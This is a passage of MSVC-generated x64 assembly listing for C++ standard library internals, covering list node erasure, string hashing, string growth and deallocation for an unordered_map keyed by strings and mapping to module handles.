?_Erase_bucket@?$_Hash@V?$_Umap_traits@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@V?$_Uhash_compare@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@@2@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@$0A@@std@@@std@@IEAAXPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z ENDP ; std::_Hash<std::_Umap_traits<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,HINSTANCE__ *,std::_Uhash_compare<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > > >,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> >,0> >::_Erase_bucket
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ??0?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 8
??0?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAA@XZ PROC ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >, COMDAT

; 353  :     _List_val() noexcept : _Myhead(), _Mysize(0) {} // initialize data

	xor	eax, eax
	mov	QWORD PTR [rcx], rax
	mov	QWORD PTR [rcx+8], rax
	mov	rax, rcx
	ret	0
??0?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAA@XZ ENDP ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Unchecked_erase@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@@Z
_TEXT	SEGMENT
this$ = 48
_Pnode$ = 56
?_Unchecked_erase@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@@Z PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_erase, COMDAT

; 1422 :     _Nodeptr _Unchecked_erase(const _Nodeptr _Pnode) noexcept { // erase element at _Pnode

$LN114:
	mov	QWORD PTR [rsp+24], rbx
	push	rdi
	sub	rsp, 32					; 00000020H

; 1423 :         const auto _Result = _Pnode->_Next;

	mov	rdi, QWORD PTR [rdx]
	mov	rbx, rdx

; 1424 :         _Mypair._Myval2._Orphan_ptr2(_Pnode);
; 1425 :         --_Mypair._Myval2._Mysize;

	dec	QWORD PTR [rcx+8]

; 1426 :         _Pnode->_Prev->_Next = _Result;

	mov	rax, QWORD PTR [rdx+8]
	mov	QWORD PTR [rax], rdi

; 1427 :         _Result->_Prev       = _Pnode->_Prev;

	mov	rax, QWORD PTR [rdx+8]
	mov	QWORD PTR [rdi+8], rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	mov	rdx, QWORD PTR [rdx+40]
	cmp	rdx, 15

; 4868 :         if (_My_data._Large_mode_engaged()) {

	jbe	SHORT $LN38@Unchecked_
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	mov	rcx, QWORD PTR [rbx+16]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2643 :         _Al.deallocate(_Old_ptr, _Capacity + 1); // +1 for null terminator

	inc	rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN52@Unchecked_

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	r8, QWORD PTR [rcx-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rcx, r8

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	lea	rax, QWORD PTR [rcx-8]
	cmp	rax, 31
	ja	SHORT $LN49@Unchecked_

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rcx, r8
$LN52@Unchecked_:

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
$LN38@Unchecked_:
	mov	edx, 56					; 00000038H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4875 :         _My_data._Mysize = 0;

	mov	QWORD PTR [rbx+32], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rbx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4876 :         _My_data._Myres  = _Small_string_capacity;

	mov	QWORD PTR [rbx+40], 15

; 4877 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4878 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	BYTE PTR [rbx+16], 0
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	call	??3@YAXPEAX_K@Z				; operator delete
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list

; 1430 :     }

	mov	rbx, QWORD PTR [rsp+64]
	mov	rax, rdi
	add	rsp, 32					; 00000020H
	pop	rdi
	ret	0
$LN49@Unchecked_:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN111@Unchecked_:
?_Unchecked_erase@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@AEAAPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@QEAU32@@Z ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Unchecked_erase
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Make_iter@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEBA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z
_TEXT	SEGMENT
this$dead$ = 8
__$ReturnUdt$ = 16
_Where$ = 24
?_Make_iter@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEBA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z PROC ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Make_iter, COMDAT

; 37   :     _List_unchecked_const_iterator(_Nodeptr _Pnode, const _Mylist* _Plist) noexcept : _Ptr(_Pnode) {

	mov	QWORD PTR [rdx], r8

; 1124 :         return iterator(_Where, _STD addressof(_Mypair._Myval2));

	mov	rax, rdx

; 1125 :     }

	ret	0
?_Make_iter@?$list@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@V?$allocator@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@2@@std@@QEBA?AV?$_List_iterator@V?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@@2@PEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z ENDP ; std::list<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,std::allocator<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Make_iter
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?deallocate@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@QEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z
_TEXT	SEGMENT
_Al$dead$ = 8
_Ptr$ = 16
_Count$dead$ = 24
?deallocate@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@QEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z PROC ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::deallocate, COMDAT

; 682  :     static _CONSTEXPR20 void deallocate(_Alloc& _Al, const pointer _Ptr, const size_type _Count) {

	mov	rcx, rdx

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	edx, 56					; 00000038H
	jmp	??3@YAXPEAX_K@Z				; operator delete
?deallocate@?$_Default_allocator_traits@V?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@@std@@SAXAEAV?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@2@QEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z ENDP ; std::_Default_allocator_traits<std::allocator<std::_List_node<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *>,void *> > >::deallocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@V?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@2@$00@std@@QEBAAEBU?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@V?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@2@$00@std@@QEBAAEBU?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@XZ PROC ; std::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1>::_Get_first, COMDAT

; 1508 :         return *this;

	mov	rax, rcx

; 1509 :     }

	ret	0
?_Get_first@?$_Compressed_pair@U?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@V?$_Compressed_pair@U?$equal_to@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@std@@M$00@2@$00@std@@QEBAAEBU?$hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@2@XZ ENDP ; std::_Compressed_pair<std::hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,std::_Compressed_pair<std::equal_to<std::basic_string<char,std::char_traits<char>,std::allocator<char> > >,float,1>,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits
;	COMDAT ??R?$_Conditionally_enabled_hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@$00@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z
_TEXT	SEGMENT
this$dead$ = 8
_Keyval$ = 16
??R?$_Conditionally_enabled_hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@$00@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z PROC ; std::_Conditionally_enabled_hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,1>::operator(), COMDAT
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rdx+24], 15

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	mov	r9, QWORD PTR [rdx+16]

; 2236 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN11@operator

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rdx, QWORD PTR [rdx]
$LN11@operator:

; 5176 :         return _Hash_array_representation(_Keyval.c_str(), _Keyval.size());

	xor	r8d, r8d
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\type_traits

; 2333 :     return _Fnv1a_append_bytes(

	mov	rax, -3750763034362895579		; cbf29ce484222325H

; 2300 :     for (size_t _Idx = 0; _Idx < _Count; ++_Idx) {

	test	r9, r9
	je	SHORT $LN32@operator
	mov	r10, 1099511628211			; 00000100000001b3H
	npad	6
$LL28@operator:

; 2301 :         _Val ^= static_cast<size_t>(_First[_Idx]);

	movzx	ecx, BYTE PTR [rdx+r8]
	inc	r8
	xor	rax, rcx

; 2302 :         _Val *= _FNV_prime;

	imul	rax, r10
	cmp	r8, r9
	jb	SHORT $LL28@operator
$LN32@operator:

; 2347 :         return hash<_Kty>::_Do_hash(_Keyval);
; 2348 :     }

	ret	0
??R?$_Conditionally_enabled_hash@V?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@$00@std@@QEBA_KAEBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@1@@Z ENDP ; std::_Conditionally_enabled_hash<std::basic_string<char,std::char_traits<char>,std::allocator<char> >,1>::operator()
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z
_TEXT	SEGMENT
this$ = 8
_Requested$ = 16
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z PROC ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth, COMDAT

; 4776 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

	mov	rax, QWORD PTR [rcx+24]

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	or	rdx, 15
	mov	r9, 9223372036854775807			; 7fffffffffffffffH
	cmp	rdx, r9

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	jbe	SHORT $LN5@Calculate_
$LN12@Calculate_:

; 4777 :     }

	mov	rax, r9
	ret	0
$LN5@Calculate_:

; 4768 :         if (_Old > _Max - _Old / 2) { // similarly, geometric overflows

	mov	r8, rax
	mov	rcx, r9
	shr	r8, 1
	sub	rcx, r8
	cmp	rax, rcx
	ja	SHORT $LN12@Calculate_

; 4769 :             return _Max;
; 4770 :         }
; 4771 : 
; 4772 :         return (_STD max)(_Masked, _Old + _Old / 2);

	lea	rcx, QWORD PTR [r8+rax]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	cmp	rdx, rcx
	cmovb	rdx, rcx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 4776 :         return _Calculate_growth(_Requested, _Mypair._Myval2._Myres, max_size());

	mov	rax, rdx

; 4777 :     }

	ret	0
?_Calculate_growth@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AEBA_K_K@Z ENDP ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::_Calculate_growth
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z
_TEXT	SEGMENT
_First$ = 8
_Count$ = 16
_Ch$ = 24
?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z PROC ; std::_Narrow_char_traits<char,int>::find, COMDAT

; 406  :         const _Elem& _Ch) noexcept /* strengthened */ {

	mov	rax, rdx

; 407  :         // look for _Ch in [_First, _First + _Count)
; 408  : #if _HAS_CXX17
; 409  : #ifdef __cpp_char8_t
; 410  :         if constexpr (is_same_v<_Elem, char8_t>) {
; 411  : #if _HAS_U8_INTRINSICS
; 412  :             return __builtin_u8memchr(_First, _Ch, _Count);
; 413  : #else // ^^^ use u8 intrinsics / no u8 intrinsics vvv
; 414  :             return _Primary_char_traits::find(_First, _Count, _Ch);
; 415  : #endif // ^^^ no u8 intrinsics ^^^
; 416  :         } else
; 417  : #endif // defined(__cpp_char8_t)
; 418  :         {
; 419  :             return __builtin_char_memchr(_First, _Ch, _Count);

	movsx	edx, BYTE PTR [r8]
	mov	r8, rax
	jmp	memchr
?find@?$_Narrow_char_traits@DH@std@@SAPEBDQEBD_KAEBD@Z ENDP ; std::_Narrow_char_traits<char,int>::find
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z
_TEXT	SEGMENT
_First1$ = 8
_First2$ = 16
_Count$ = 24
?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z PROC ; std::_Narrow_char_traits<char,int>::compare, COMDAT

; 377  :         // compare [_First1, _First1 + _Count) with [_First2, ...)
; 378  : #if _HAS_CXX17
; 379  :         return __builtin_memcmp(_First1, _First2, _Count);

	jmp	memcmp
?compare@?$_Narrow_char_traits@DH@std@@SAHQEBD0_K@Z ENDP ; std::_Narrow_char_traits<char,int>::compare
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\list
;	COMDAT ?_Orphan_ptr2@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAAXPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z
_TEXT	SEGMENT
this$dead$ = 8
_Ptr$dead$ = 16
?_Orphan_ptr2@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAAXPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z PROC ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Orphan_ptr2, COMDAT

; 356  : #if _ITERATOR_DEBUG_LEVEL == 2
; 357  :         _Lockit _Lock(_LOCK_DEBUG);
; 358  :         _Iterator_base12** _Pnext = &this->_Myproxy->_Myfirstiter;
; 359  :         const auto _Head          = _Myhead;
; 360  :         while (*_Pnext) {
; 361  :             _Iterator_base12** _Pnextnext = &(*_Pnext)->_Mynextiter;
; 362  :             const auto _Pnextptr          = static_cast<_List_const_iterator<_List_val>&>(**_Pnext)._Ptr;
; 363  :             if (_Pnextptr == _Head || _Pnextptr != _Ptr) {
; 364  :                 // iterator is end() or doesn't point at the one we are orphaning, move on
; 365  :                 _Pnext = _Pnextnext;
; 366  :             } else { // orphan the iterator
; 367  :                 (*_Pnext)->_Myproxy = nullptr;
; 368  :                 *_Pnext             = *_Pnextnext;
; 369  :             }
; 370  :         }
; 371  : #else // ^^^ _ITERATOR_DEBUG_LEVEL == 2 / _ITERATOR_DEBUG_LEVEL != 2 vvv
; 372  :         (void) _Ptr;
; 373  : #endif // ^^^ _ITERATOR_DEBUG_LEVEL != 2 ^^^
; 374  :     }

	ret	0
?_Orphan_ptr2@?$_List_val@U?$_List_simple_types@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@@std@@@std@@QEAAXPEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@@Z ENDP ; std::_List_val<std::_List_simple_types<std::pair<std::basic_string<char,std::char_traits<char>,std::allocator<char> > const ,HINSTANCE__ *> > >::_Orphan_ptr2
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?deallocate@?$allocator@U?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@std@@@std@@QEAAXQEAU?$_List_node@U?$pair@$$CBV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@PEAUHINSTANCE__@@@std@@PEAX@2@_K@Z
_TEXT	SEGMENT
this$dead$ = 8
_Ptr$ = 16
_Count$dead$ = 24
